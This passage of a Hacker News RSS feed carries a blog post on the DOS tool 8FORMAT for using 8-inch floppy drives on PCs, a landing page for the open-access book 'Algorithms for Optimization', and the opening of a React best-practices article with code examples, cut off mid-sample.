		<p>This is a follow-up to my previous article about <a href="http://boginjr.com/it/hw/8inch-drives/">connecting old 8‚Ä≥ drives directly to a PC</a> equipped with a classic floppy disk controller. Since there is a way on how to do it on a hardware level without paid or proprietary equipment, there still needs to be a free and available software solution that enables the OS to interface these drives, as they were not officially supported on the PC during its entire history whatsoever. So, during my experiments, I‚Äôve came up with one: <a href="http://boginjr.com/apps/8format/8format.zip">8FORMAT</a> ‚Äì a small software bundle that‚Äôs also released <a href="https://github.com/climatex/8FORMAT" target="_blank" rel="noopener">open source</a>.</p>
<p>Since 8 inch drives are vintage and they predate the PC as we know it, my original intent was to experiment with these drives without relying on specialized equipment ‚Äì an x86 PC with a vanilla floppy controller, with a makeshift cable and a power supply that feeds the drive, was aimed to be enough to make the drive operational. As such, to keep things simple, an OS was chosen that also runs on vintage equipment with no issues, and can provide down-to-the-bone hardware access without driver hassle. Yes, 8FORMAT is a DOS application. So, what does it do exactly?</p>
<p><a href="http://boginjr.com/wp-content/uploads/8format-1.png" data-rel="lightbox-gallery-etqWfbs5" data-magnific_type="image" data-rl_title="8FORMAT, Command line arguments" data-rl_caption="" title="8FORMAT, Command line arguments"><img loading="lazy" src="http://boginjr.com/wp-content/uploads/8format-1.png" alt="" width="720" height="540" srcset="http://boginjr.com/wp-content/uploads/8format-1.png 720w, http://boginjr.com/wp-content/uploads/8format-1-300x225.png 300w" sizes="(max-width: 720px) 100vw, 720px"></a><strong>Available command-line arguments</strong></p>
<p>Like Dave Dunfield‚Äôs ImageDisk (IMD), 8FORMAT is also a multi-purpose DOS application that interfaces the floppy disk controller directly. However, 8FORMAT also tries to persuade the system BIOS to ‚Äúaccept‚Äù the drive, so that it can be used directly in DOS ‚Äì or even Windows (up to 9x/ME). For this to work however, also a FAT filesystem needs to be created on the 8-inch disk, and no DOS utility, including IMD, would do that out of the box. So 8FORMAT was a product of my direct experimentation with these drives under the PC environment, with all of their quirks and pitfalls.<br>
The application has 2 main modes: <strong>formatting</strong> and <strong>using</strong> the disk. In the vanilla <strong>format</strong> mode, 8FORMAT will initialize and format the sectors with the chosen geometry or TYPE. A total of 5 pre-defined geometry types are provided, both the ‚Äúhistorical‚Äù ones and the ‚Äúextended‚Äù, or experimental ones, to be tried under DOS on an x86 PC. The format and read/write gaps between sectors are auto-set, but can be also tweaked. In addition to that, 8FORMAT can also try writing the DOS boot sector and filesystem, even on a non-512-byte-formatted disk (highly experimental), and it also supports custom floppy disk controllers given their base address, IRQ and DMA settings. Defaultly however, 8FORMAT will only format the disk, and won‚Äôt create any filesystems at all.<br>
In the <strong>use</strong> mode, 8FORMAT will install a resident ‚Äúdriver‚Äù that overrides the ‚ÄúDiskette Parameter Table‚Äù (DPT, INT 1eh) of the PC BIOS and the INT 13h ‚Äúget drive type‚Äù and geometry calls, forcing any application or OS reliant on the BIOS to work with the 8‚Ä≥ drive, even if the physical sector size is non-standard. This includes most versions of DOS and early versions of Windows that were basically just improved DOS shells (1.01 to 4.x, i.e. 95, 98).<br>
However, due to limitations in the BIOS and how the DPT works, once the driver is installed resident, this 8-inch drive data is applied for all floppy drives ‚Äì 5,25‚Ä≥ or 3,5‚Ä≥ drives will become non-operational and their system BIOS setting ignored. As such, the 8‚Ä≥ drive cannot coexist (properly) with other standard floppy drives in one machine, or on one floppy controller to be exact. And, for this very same reason, 8FORMAT shall only be launched from a hard drive/RAM drive or similar.<br>
The <strong>use mode</strong> can be either invoked by calling 8FORMAT with the <strong>/USE</strong> argument, to start using an 8-inch disk in the drive, and it is also asked at the end of a successful format operation.</p>
<p><a href="http://boginjr.com/wp-content/uploads/8inch-18.jpg" data-rel="lightbox-gallery-etqWfbs5" data-magnific_type="image" data-rl_title="DOS with a 26sector/256byte 8inch media" data-rl_caption="" title="DOS with a 26sector/256byte 8inch media"><img loading="lazy" src="http://boginjr.com/wp-content/uploads/8inch-18-1024x584.jpg" alt="" width="1024" height="584" srcset="http://boginjr.com/wp-content/uploads/8inch-18-1024x584.jpg 1024w, http://boginjr.com/wp-content/uploads/8inch-18-300x171.jpg 300w, http://boginjr.com/wp-content/uploads/8inch-18-768x438.jpg 768w, http://boginjr.com/wp-content/uploads/8inch-18.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"></a><strong>Experimenting with a 256-byte physical-sectored 8‚Ä≥ disk under DOS<br>
(invoking the /USE mode)<br>
</strong></p>
<p>The command-line arguments might seem a little intimidating, but are quite self-explanatory. One of the main arguments is specifying the TYPE, or geometry and density combo of the disk being formatted. This can be one of the following:</p>
<ul>
<li>the <strong>DSSD</strong> type, which is a double-sided variant of the ‚Äúhistorical‚Äù single-density format, with 128 byte sectors and 26 of them per track. Choosing this type requires a floppy controller that supports FM encoding at a 250 kbps data rate;</li>
<li>the <strong>DSDD</strong> type, which is ‚Äì again ‚Äì a historical format, yielding 8 sectors per track, 1024 bytes each, at a 500 kbps data rate.</li>
</ul>
<p>These two types were originally used in mainframe and ‚Äúminicomputer‚Äù environments, running CP/M or similar. From the PC perspective, these have a non-standard physical sector size. Although 8FORMAT can make the BIOS recognize these formats, and even try writing a DOS filesystem on them; there are not many applications that use the BIOS disk calls with a physical sector size other than 512 bytes (see the ‚Äúquirks‚Äù below).<br>
In addition to these two ‚Äúhistorically standard‚Äù formats, there are three ‚Äúextended‚Äù experimental formats that I have came up with, named EXT1 to EXT3:</p>
<ul>
<li>The <strong>EXT1</strong> type is a variant of the historic <strong>DSDD</strong> type, except that it uses 512 byte size per sector. So, instead of eight 1K sectors per track, there are sixteen 512B sectors per track; with the sector gaps reduced slightly to make them fit in a track proper. This type can essentially be called a ‚ÄúDOS-compatible DSDD‚Äù, and will safely occupy all the extents of a double-sided, double-density 8-inch floppy disk.</li>
<li>The <strong>EXT2</strong> type is a double-sided variant of the ‚ÄúSS/DD‚Äù diskettes that were used in Tandy TRS-80 Model II and similar rigs: 26 sectors per track, each sector with a size of 256 bytes.</li>
<li>And finally, the <strong>EXT3</strong> type, which 8FORMAT tries to access like if it was a DD 5,25‚Ä≥ 360K drive, just with 77 tracks instead of 40, i.e. nine 512-byte sectors per track.</li>
</ul>
<p>Of course, any of these types can be converted to single-side by specifying <strong>/1</strong> as an optional command line argument.<br>
It‚Äôs worth noting that only the two 512-byte-sectored formats, <strong>EXT1</strong> and <strong>EXT3</strong>, can be safely used directly under the DOS environment on a PC, because of details that follow below (especially in ‚ÄúQuirk #3‚Äù); on an x86 PC, the rest of the formats are for experimentation purposes, mostly when treated as logical formats with a 512-byte geometry (see ‚ÄúQuirk #10‚Äù).</p>
<p><a href="http://boginjr.com/wp-content/uploads/8format-2.png" data-rel="lightbox-gallery-etqWfbs5" data-magnific_type="image" data-rl_title="8FORMAT, formatting with verify" data-rl_caption="" title="8FORMAT, formatting with verify"><img loading="lazy" src="http://boginjr.com/wp-content/uploads/8format-2.png" alt="" width="800" height="605" srcset="http://boginjr.com/wp-content/uploads/8format-2.png 800w, http://boginjr.com/wp-content/uploads/8format-2-300x227.png 300w, http://boginjr.com/wp-content/uploads/8format-2-768x581.png 768w" sizes="(max-width: 800px) 100vw, 800px"></a><strong>Formatting and verifying, to be followed with a FAT filesystem creation</strong></p>
<p>Now, for all types <strong>except DSSD</strong> and <strong>EXT3</strong>, you will be needing a floppy disk controller that supports 500 kbps data transfers, i.e. one that is ‚Äúhigh density capable‚Äù and can read and write 1,44MB 3,5‚Ä≥ (or 1,2MB 5,25‚Ä≥) disks without any issues.<br>
In addition to that, to experiment with type <strong>DSSD</strong>, the FDC as whole (not just the chip itself!), shall also support FM data transfers at a 250 kbps rate. And tell you what, <a href="https://services.theglitchworks.net/ng/testfdc_results" target="_blank" rel="noopener">not many floppy controllers can do that</a>.<br>
The <strong>EXT3</strong> is an exception, and is the only format that shall (technically) work with a vanilla DD PC floppy disk controller, i.e. the one that only goes with 5,25‚Ä≥ 360K or 3,5‚Ä≥ 720K drives. However, <a href="http://boginjr.com/it/hw/8inch-drives/">out of the three 8-inch drives mentioned in my parent article</a>, the FDCs that I tried were not able to find the address mark of any track formatted this way. In the end, I had to switch the 500kbps data rate manually on with the <strong>/500K</strong> argument, to force ‚Äúhigh density‚Äù on something that was called ‚Äúdouble density‚Äù on a much smaller floppy disk.&nbsp; So, an HD-capable PC FDC remains as a necessity for experimentation ‚Äì but you might be luckier with the EXT3 and your drive üôÇ<br>
As a side note, the EXT3 type worked well with a 5,25‚Ä≥ drive on a DD-only floppy controller ‚Äì of course, only up to track 40. üôÇ</p>
<p><a href="http://boginjr.com/wp-content/uploads/8format-3.png" data-rel="lightbox-gallery-etqWfbs5" data-magnific_type="image" data-rl_title="8FORMAT, experimental creation of a FAT filesystem" data-rl_caption="" title="8FORMAT, experimental creation of a FAT filesystem"><img loading="lazy" src="http://boginjr.com/wp-content/uploads/8format-3.png" alt="" width="800" height="516" srcset="http://boginjr.com/wp-content/uploads/8format-3.png 800w, http://boginjr.com/wp-content/uploads/8format-3-300x194.png 300w, http://boginjr.com/wp-content/uploads/8format-3-768x495.png 768w" sizes="(max-width: 800px) 100vw, 800px"></a><strong>Finished formatting, asking the user to install the resident driver</strong></p>
<p>The resident driver part (<strong>8TSR.EXE</strong> of the software bundle) is invoked by 8FORMAT after specifying the <strong>/USE</strong> argument, to start using the 8-inch disk in DOS, or directly after a successful format operation, shall the user press ENTER to reflect the new 8-inch geometry. 8FORMAT with /USE shall always be called before the very first 8-inch disk operation with BIOS or DOS, unless the disk was just formatted and ENTER pressed when asked to do so.<br>
This DOS TSR determines the location of the BIOS Diskette Parameter Table (DPT), copies it into a memory location it can write into (if necessary), instructs the BIOS to start using the new 8-inch drive parameters (due to platform limitations, for all floppy drives ‚Äì sadly), hooks the INT 13h interrupt to start returning the new 8-inch geometry when asked by applications, and also hooks the timer interrupt, that tries to make sure nothing overrides the new 8-inch drive DPT. /NB: This is because in DOS real mode, memory access is unrestricted./<br>
Afterwards, the 8-inch drive can usually be accessed with normal DOS commands, to copy new files, move the other, run applications etc. But, using ‚Äúspecialized‚Äù tools that don‚Äôt even have the slighest idea about what kind of drive is present in the system (vanilla FORMAT, DISKCOPY, various disk doctors and whatnot) can corrupt the data written on the disk. Remember, 8‚Ä≥ drives were not supported on the PC at all ‚Äì and the 8FORMAT/8TSR is a hack üôÇ</p>
<p><a href="http://boginjr.com/wp-content/uploads/8format-4.png" data-rel="lightbox-gallery-etqWfbs5" data-magnific_type="image" data-rl_title="8FORMAT, new drive values" data-rl_caption="" title="8FORMAT, new drive values"><img loading="lazy" src="http://boginjr.com/wp-content/uploads/8format-4.png" alt="" width="700" height="323" srcset="http://boginjr.com/wp-content/uploads/8format-4.png 700w, http://boginjr.com/wp-content/uploads/8format-4-300x138.png 300w" sizes="(max-width: 700px) 100vw, 700px"></a><strong>8-inch drive stepper motor timings and disk geometry successfully updated</strong></p>
<p>The last application of the software bundle is <strong>TESTREAD.COM</strong>. This is a small DOS application that invokes BIOS INT 13h services /the same ones that DOS uses/ to verify reading a couple of sectors off the specified floppy drive, of what size the sectors are, and dumping them to disk. This can be used, for example, together with 8FORMAT /USE to proof-read whether the actual BIOS can read a non-512-byte-sector floppy, even though 99.9% of applications using BIOS calls WILL expect that the PC BIOS always returns a 512 byte floppy buffer. See the ‚ÄúQuirks‚Äù below.</p>
<p><a href="http://boginjr.com/wp-content/uploads/8format-5.png" data-rel="lightbox-gallery-etqWfbs5" data-magnific_type="image" data-rl_title="8FORMAT, BIOS INT 13h reading 1K sectors" data-rl_caption="" title="8FORMAT, BIOS INT 13h reading 1K sectors"><img loading="lazy" src="http://boginjr.com/wp-content/uploads/8format-5.png" alt="" width="712" height="210" srcset="http://boginjr.com/wp-content/uploads/8format-5.png 712w, http://boginjr.com/wp-content/uploads/8format-5-300x88.png 300w" sizes="(max-width: 712px) 100vw, 712px"></a><strong>Reading 1K sectors with BIOS INT 13h off an 8‚Ä≥ floppy in DOS</strong><br>
<strong>(8TSR modifies the BIOS Data Area to accomplish this)</strong></p>
<p>Now come some of the software pitfalls, or ‚Äúquirks‚Äù, of operating an 8-inch drive with a PC; i.e. not just related to the usage of 8FORMAT. Most of the hardware ones, were talked about <a href="http://boginjr.com/it/hw/8inch-drives/">in the parent article</a>, we‚Äôll go deeper in here with the ‚Ä¶</p></div></article></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://boginjr.com/it/sw/dev/8format/">http://boginjr.com/it/sw/dev/8format/</a></em></p>]]>
            </description>
            <link>http://boginjr.com/it/sw/dev/8format/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124761</guid>
            <pubDate>Sat, 13 Feb 2021 17:02:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Algorithms for Optimization Now Open Access]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26124759">thread link</a>) | @Mageek
<br/>
February 13, 2021 | https://algorithmsbook.com/optimization/ | <a href="https://web.archive.org/web/*/https://algorithmsbook.com/optimization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">



				<!-- Header -->

					



				<!-- Main -->

					<div id="main">



						<!-- Intro -->

							<article id="intro">

								<h2>Intro</h2>

								<p>This book provides a comprehensive introduction to optimization with a focus on practical algorithms. The book approaches optimization from an engineering perspective, where the objective is to design a system that optimizes a set of metrics subject to constraints. Readers will learn about computational approaches for a range of challenges, including searching high-dimensional spaces, handling problems where there are multiple competing objectives, and accommodating uncertainty in the metrics. Figures, examples, and exercises convey the intuition behind the mathematical approaches. The text provides concrete implementations in the Julia programming language. Topics covered include derivatives and their generalization to multiple dimensions; local descent and first- and second-order methods that inform local descent; stochastic methods, which introduce randomness into the optimization process; linear constrained optimization, when both the objective function and the constraints are linear; surrogate models, probabilistic surrogate models, and using probabilistic surrogate models to guide optimization; optimization under uncertainty; uncertainty propagation; expression optimization; and multidisciplinary design optimization. Appendixes offer an introduction to the Julia language, test functions for evaluating algorithm performance, and mathematical concepts used in the derivation and analysis of the optimization methods discussed in the text. The book can be used by advanced undergraduates and graduate students in mathematics, statistics, computer science, any engineering field, (including electrical engineering and aerospace engineering), and operations research, and as a reference for professionals.</p>

							</article>



						<!-- Download -->

							<article id="download">

								<h2>Download</h2>

								<p>The full book is available as a <a href="https://algorithmsbook.com/optimization/files/optimization.pdf" rel="nofollow">PDF</a>. You can also download <a href="#outline">individual chapters</a>. The PDF is shared under a under a Creative Commons CC-BY-NC-ND license.
								</p>
								<p>
									The copyright of this book has been licensed exclusively to <a href="http://mitpress.mit.edu/">The MIT Press</a>.  All inquiries regarding rights should be addressed to The MIT Press, Rights and Permissions Department.
									A <a href="https://mitpress.mit.edu/books/algorithms-optimization">print version</a> is available for purchase.
								</p>


							</article>



						<!-- Outline -->

							<article id="outline">

								<h2>Outline</h2>

								<ol>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-1.pdf" rel="nofollow">Introduction</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-2.pdf" rel="nofollow">Derivatives and Gradients</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-3.pdf" rel="nofollow">Bracketing</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-4.pdf" rel="nofollow">Local Descent</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-5.pdf" rel="nofollow">First-Order Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-6.pdf" rel="nofollow">Second Order Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-7.pdf" rel="nofollow">Direct Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-8.pdf" rel="nofollow">Stochastic Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-9.pdf" rel="nofollow">Population Methods</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-10.pdf" rel="nofollow">Constraints</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-11.pdf" rel="nofollow">Linear Constrained Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-12.pdf" rel="nofollow">Multiobjective Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-13.pdf" rel="nofollow">Sampling Plans</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-14.pdf" rel="nofollow">Surrogate Models</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-15.pdf" rel="nofollow">Probabilistic Surrogate Models</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-16.pdf" rel="nofollow">Surrogate Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-17.pdf" rel="nofollow">Optimization under Uncertainty</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-18.pdf" rel="nofollow">Uncertainty Propagation</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-19.pdf" rel="nofollow">Discrete Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-20.pdf" rel="nofollow">Expression Optimization</a></li>

								<li><a href="https://algorithmsbook.com/optimization/files/chapter-21.pdf" rel="nofollow">Multidisciplinary Optimization</a></li>

								</ol>

								<h3>Appendices</h3>

								<ol start="22">

								<li>A: <a href="https://algorithmsbook.com/optimization/files/appendix-a.pdf" rel="nofollow">Julia</a></li>

								<li>B: <a href="https://algorithmsbook.com/optimization/files/appendix-b.pdf" rel="nofollow">Test Functions</a></li>

								<li>C: <a href="https://algorithmsbook.com/optimization/files/appendix-c.pdf" rel="nofollow">Mathematical Concepts</a></li>

								<li>D: <a href="https://algorithmsbook.com/optimization/files/appendix-d.pdf" rel="nofollow">Solutions</a></li>

								</ol>

								

							</article>



						<!-- Bugs -->

							<article id="errata">

								<h2>Errata</h2>

								<p>Please file issues on <a href="https://github.com/algorithmsbooks/optimization/issues">GitHub</a> or email the address listed at the bottom of the pages of the PDF. The PDF is kept up to date with any corrections.

								</p>

							</article>



					</div>



				<!-- Footer -->

					



			</div></div>]]>
            </description>
            <link>https://algorithmsbook.com/optimization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124759</guid>
            <pubDate>Sat, 13 Feb 2021 17:02:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Best Practices for 2021]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26124742">thread link</a>) | @thenoisywatcher
<br/>
February 13, 2021 | https://blog.asayer.io/6-react-best-practices-for-2021 | <a href="https://web.archive.org/web/*/https://blog.asayer.io/6-react-best-practices-for-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Writing clean and readable code is essential to improve your code‚Äôs quality. On top of that, clean code is easier to test. There‚Äôs no reason not to spend five extra minutes refactoring your code to make it more readable.</p><p>This article looks at six React best practices for 2021 to improve your code. We‚Äôll cover the following items:</p><ol><li>Make use of <code>event.target.name</code> for event handlers</li><li>How to avoid manually binding event handlers to <code>this</code>?</li><li>Make use of React hooks to update your state</li><li>Cache expensive operations with <code>useMemo</code></li><li>Decouple functions into functional functions to improve code quality</li><li>How do you create custom hooks in React?</li></ol><h2 id="1-use-event-handler-name">#1: Use event handler name</h2><p>When you have a form with a single input field, you‚Äôll write one <code>onFirstInputChange</code> function to capture the contents of your input field.</p><p>However, do you write ten event handlers when you have a form with ten input fields? The answer is no.</p><p>We can set the name property on an input field and access it from the event handler. This value allows us to use a single input handler for <code>onChange</code> events. </p><p>Here‚Äôs your current situation when using a not-optimized form with two input fields. We have to define an <code>onChange</code> event handler for each individual form input element. This pattern creates a lot of duplicate code, which is hard to maintain.</p><div><pre><p><span>1</span><span>export</span><span> </span><span>default</span><span> </span><span>class</span><span> </span><span>App</span><span> </span><span>extends</span><span> </span><span>React</span><span>.</span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>    </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>        </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>        </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>5</span><span>            item1</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>6</span><span>            item2</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>7</span><span>            items</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>8</span><span>            errorMsg</span><span>:</span><span> </span><span>""</span><span></span></p><p><span>9</span><span>        </span><span>}</span><span>;</span><span></span></p><p><span>10</span><span>        </span><span>this</span><span>.</span><span>onFirstInputChange</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>onFirstInputChange</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>11</span><span>        </span><span>this</span><span>.</span><span>onSecondInputChange</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>onSecondInputChange</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>12</span><span>    </span><span>}</span><span></span></p><p><span>13</span><span>    </span><span>onFirstInputChange</span><span>(</span><span>event</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>14</span><span>        </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>15</span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>16</span><span>            item1</span><span>:</span><span> value</span></p><p><span>17</span><span>        </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>18</span><span>    </span><span>}</span><span></span></p><p><span>19</span><span>    </span><span>onSecondInputChange</span><span>(</span><span>event</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>20</span><span>        </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>21</span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>22</span><span>            item2</span><span>:</span><span> value</span></p><p><span>23</span><span>        </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>24</span><span>    </span><span>}</span><span></span></p><p><span>25</span><span>    </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>26</span><span>        </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>27</span><span>            </span><span>&lt;</span><span>div</span><span>&gt;</span><span></span></p><p><span>28</span><span>                </span><span>&lt;</span><span>div className</span><span>=</span><span>"input-section"</span><span>&gt;</span><span></span></p><p><span>29</span><span>                    </span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>errorMsg</span><span> </span><span>&amp;&amp;</span><span> </span><span>(</span><span></span></p><p><span>30</span><span>                        </span><span>&lt;</span><span>p className</span><span>=</span><span>"error-msg"</span><span>&gt;</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>errorMsg</span><span>}</span><span>&lt;</span><span>/</span><span>p</span><span>&gt;</span><span></span></p><p><span>31</span><span>                    </span><span>)</span><span>}</span><span></span></p><p><span>32</span><span>                    </span><span>&lt;</span><span>input</span></p><p><span>33</span><span>                        type</span><span>=</span><span>"text"</span><span></span></p><p><span>34</span><span>                        name</span><span>=</span><span>"item1"</span><span></span></p><p><span>35</span><span>                        placeholder</span><span>=</span><span>"Enter text"</span><span></span></p><p><span>36</span><span>                        value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>item1</span><span>}</span><span></span></p><p><span>37</span><span>                        onChange</span><span>=</span><span>{</span><span>this</span><span>.</span><span>onFirstInputChange</span><span>}</span><span></span></p><p><span>38</span><span>                    </span><span>/</span><span>&gt;</span><span></span></p><p><span>39</span><span>                    </span><span>&lt;</span><span>input</span></p><p><span>40</span><span>                        type</span><span>=</span><span>"text"</span><span></span></p><p><span>41</span><span>                        name</span><span>=</span><span>"item2"</span><span></span></p><p><span>42</span><span>                        placeholder</span><span>=</span><span>"Enter more text"</span><span></span></p><p><span>43</span><span>                        value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>state</span><span>.</span><span>item2</span><span>}</span><span></span></p><p><span>44</span><span>                        onChange</span><span>=</span><span>{</span><span>this</span><span>.</span><span>onSecondInputChange</span><span>}</span><span></span></p><p><span>45</span><span>                    </span><span>/</span><span>&gt;</span><span></span></p><p><span>46</span><span>                </span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span><span></span></p><p><span>47</span><span>            </span><span>&lt;</span><span>/</span><span>div</span><span>&gt;</span><span></span></p><p><span>48</span><span>      </span><span>)</span><span>;</span><span></span></p><p><span>49</span><span>    </span><span>}</span><span></span></p><p><span>50</span><span></span><span>}</span></p></pre></div><p>As you can see, each event handler function updates the state. When dealing with multiple form elements, your code becomes very messy as you have to write a new function for every event.</p><p>Let‚Äôs tackle this situation differently using the <code>name</code> field. We can access this value via the <code>event.target.name</code> property. Now, we can create a single function that can handle both events at once. Therefore, we can remove both functions <code>onFirstInputChange</code> and <code>onSecondInputChange</code>.</p><div><pre><p><span>1</span><span>onInputChange</span><span> </span><span>=</span><span> </span><span>(</span><span>event</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>const</span><span> name </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>name</span><span>;</span><span></span></p><p><span>3</span><span>  </span><span>const</span><span> value </span><span>=</span><span> event</span><span>.</span><span>target</span><span>.</span><span>value</span><span>;</span><span></span></p><p><span>4</span><span>  </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>5</span><span>    </span><span>[</span><span>name</span><span>]</span><span>:</span><span> value</span></p><p><span>6</span><span>  </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span><span>;</span></p></pre></div><p>Easy, right? Of course, you often need additional validation for the data you save to your state. You can make use of a <code>switch</code> statement to add custom validation rules for each submitted value.</p><h2 id="2-avoid-manually-binding-this">#2: Avoid manually binding <code>this</code></h2><p>You will most likely know that React doesn‚Äôt retain the <code>this</code> binding when attaching an event handler to an <code>onClick</code> or <code>onChange</code> event. Therefore, we need to bind <code>this</code> manually. <em>Why do we bind</em> <code>*this*</code><em>?</em> We want to bind the <code>this</code> of the event handler to the component‚Äô instance, so we don‚Äôt lose its context when we pass it as a callback.</p><p>Here‚Äôs a classic ‚Äúbinding‚Äù example that happens in the constructor.</p><div><pre><p><span>1</span><span>class</span><span> </span><span>Button</span><span> </span><span>extends</span><span> </span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span> clicked</span><span>:</span><span> </span><span>false</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>5</span><span>    </span><span>this</span><span>.</span><span>handleClick</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>handleClick</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span>  </span><span>}</span><span></span></p><p><span>7</span><span>  </span></p><p><span>8</span><span>  </span><span>handleClick</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>this</span><span>.</span><span>props</span><span>.</span><span>setState</span><span>(</span><span>{</span><span> clicked</span><span>:</span><span> </span><span>true</span><span> </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>}</span><span></span></p><p><span>11</span><span>  </span></p><p><span>12</span><span>  </span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>13</span><span>    </span><span>return</span><span> </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>this</span><span>.</span><span>handleClick</span><span>}</span><span>&gt;</span><span>Click</span><span> me</span><span>!</span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span>;</span><span></span></p><p><span>14</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>15</span><span></span><span>}</span></p></pre></div><p>Yet, binding is not necessary anymore since the <code>create-react-app</code> CLI command makes use of <code>@babel/babel-plugin-transform-class-properties</code> plugin version &gt;=7 and <code>babel/plugin-proposal-class-properties</code> plugin version &lt;7. </p><blockquote><p>Note: You have to change the event handler syntax to arrow function syntax.</p></blockquote><p>Below you find an example of the arrow function syntax. Here, we don‚Äôt need to write additional code in the constructor to bind <code>this</code>.</p><div><pre><p><span>1</span><span>class</span><span> </span><span>Button</span><span> </span><span>extends</span><span> </span><span>Component</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>constructor</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    </span><span>super</span><span>(</span><span>props</span><span>)</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>this</span><span>.</span><span>state</span><span> </span><span>=</span><span> </span><span>{</span><span> clicked</span><span>:</span><span> </span><span>false</span><span> </span><span>}</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>}</span><span></span></p><p><span>6</span><span>  </span></p><p><span>7</span><span>  </span><span>handleClick</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span>clicked</span><span>:</span><span> </span><span>true</span><span> </span><span>}</span><span>)</span><span>;</span><span></span></p><p><span>8</span><span>  